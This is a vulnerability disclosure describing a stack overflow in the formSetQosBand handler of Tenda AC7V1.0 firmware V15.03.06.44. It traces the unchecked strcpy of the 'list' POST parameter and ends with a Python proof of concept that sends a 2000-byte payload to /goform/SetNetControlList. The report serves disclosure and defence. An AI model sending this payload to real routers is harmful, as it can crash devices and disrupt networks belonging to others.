## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2776.html

## Affected version

 AC7V1.0 V15.03.06.44

## Vulnerability details

In the Tenda AC7V1.0 V15.03.06.44 firmware has a stack overflow vulnerability in the `formSetQosBand` function. The `list` variable receives the `list` parameter from a POST request and this variable is passed into function `setQosMiblist` as `list`. In function `setQosMiblist`, variable `list` is passed to `p`, which is later assigned to the `qos_str` variable, which is fixed at 256 bytes. However, since the user can control the input of `list`, the statement `strcpy(qos_str, p);` can cause a buffer overflow. The user-provided  `list` can exceed the capacity of the `qos_str` array, triggering this security vulnerability.

![image-20240318163148549](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318163148549.png)

![image-20240318163338017](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318163338017.png)



![image-20240318163256951](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318163256951.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetNetControlList"
payload = b"a"*2000

data = {"list": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240318163414028](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318163414028.png)
